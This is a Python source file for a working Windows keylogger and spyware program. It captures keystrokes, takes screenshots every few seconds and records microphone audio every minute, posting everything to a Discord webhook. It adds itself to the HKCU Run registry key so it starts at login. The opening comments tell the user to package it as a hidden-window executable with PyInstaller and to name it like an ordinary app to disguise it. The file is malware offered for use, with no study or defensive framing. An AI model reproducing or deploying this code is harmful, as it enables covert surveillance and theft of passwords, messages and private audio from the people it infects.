# this file became auto maticly startup
# for making this an exe file 
# change it as your need you can always it as the any windows file (app_name = "MyAwesomeApp")
# in bash `pyinstaller --onefile --windowed your_script.py`
# donot forget to install the (pip install pyinstaller)


import os
import sys
import winreg  # For adding to startup
import pyautogui
import requests
import threading
from datetime import datetime
import pyaudio
import wave

class KeyLogger:
    def __init__(self, webhook_url, time_interval=7):
        self.webhook_url = webhook_url
        self.time_interval = time_interval
        self.images_folder = "images"
        self.audio_folder = "audio"
        self.audio_filename = "audio.wav"
        self.text = []

        # Create the images folder if it doesn't exist
        if not os.path.exists(self.images_folder):
            os.makedirs(self.images_folder)

        # Create the audio folder if it doesn't exist
        if not os.path.exists(self.audio_folder):
            os.makedirs(self.audio_folder)

    def get_unique_filename(self):
        """Generate a unique filename using a timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"{self.images_folder}/screenshot_{timestamp}.png"

    def take_screenshot(self):
        """Take a screenshot and save it with a unique filename."""
        filename = self.get_unique_filename()
        pyautogui.screenshot(filename)
        return filename

    def send_data(self):
        """Send the captured data and screenshot to the webhook."""
        filename = self.take_screenshot()
        with open(filename, "rb") as f:
            files = {"file": (os.path.basename(filename), f, "image/png")}
            data = {"content": "".join(self.text)}
            try:
                requests.post(self.webhook_url, files=files, data=data)
            except Exception as e:
                print(f"Failed to send data: {e}")

        # Delete the screenshot file
        os.remove(filename)

        # Clear the text buffer
        self.text = []

        # Schedule the next send
        threading.Timer(self.time_interval, self.send_data).start()

    def record_audio(self):
        """Record audio for 10 seconds and send it to the webhook."""
        audio = pyaudio.PyAudio()

        # Configure the audio stream
        try:
            stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        except Exception as e:
            print(f"Failed to open audio stream: {e}")
            return

        frames = []

        # Record audio for 10 seconds
        for _ in range(0, int(44100 / 1024 * 10)):
            data = stream.read(1024, exception_on_overflow=False)
            frames.append(data)

        # Stop and close the stream
        stream.stop_stream()
        stream.close()
        audio.terminate()

        # Save the audio file
        audio_path = os.path.join(self.audio_folder, self.audio_filename)
        try:
            with wave.open(audio_path, "wb") as wave_file:
                wave_file.setnchannels(1)
                wave_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                wave_file.setframerate(44100)
                wave_file.writeframes(b"".join(frames))
        except Exception as e:
            print(f"Failed to save audio file: {e}")
            return

        # Send the audio file to the webhook
        try:
            with open(audio_path, "rb") as f:
                files = {"file": (self.audio_filename, f, "audio/wav")}
                requests.post(self.webhook_url, files=files)
        except Exception as e:
            print(f"Failed to send audio: {e}")

        # Delete the audio file
        if os.path.exists(audio_path):
            os.remove(audio_path)

        # Schedule the next audio recording
        threading.Timer(60, self.record_audio).start()

    def on_press(self, key):
        """Handle key press events."""
        try:
            self.text.append(key.char)
        except AttributeError:
            if key == key.space:
                self.text.append(" ")
            elif key == key.enter:
                self.text.append("\n")
            elif key == key.tab:
                self.text.append("\t")
            elif key == key.backspace:
                if self.text:
                    self.text.pop()
            elif key == key.esc:
                # Stop the keylogger
                return False

    def run(self):
        """Start the keylogger."""
        self.send_data()
        self.record_audio()
        # Start the keyboard listener
        from pynput.keyboard import Listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

def add_to_startup_registry():
    """Add the script to Windows startup."""
    try:
        # Path to your exe file (current executable)
        exe_path = sys.executable
        app_name = "KeyLoggerApp"  # Change this to your app's name

        # Open Registry Key for Current User (for system-wide use, admin privileges are required)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                              r"Software\Microsoft\Windows\CurrentVersion\Run", 
                              0, 
                              winreg.KEY_SET_VALUE)
        
        # Add app path to Registry
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        
        print("Successfully added to startup.")
    except Exception as e:
        print(f"Failed to add to startup: {e}")

if __name__ == "__main__":
    # Add the script to startup
    add_to_startup_registry()

    # Start the keylogger
    webhook_url = "The_url_of_discord_intigration_stuff"
    keylogger = KeyLogger(webhook_url)
    keylogger.run()
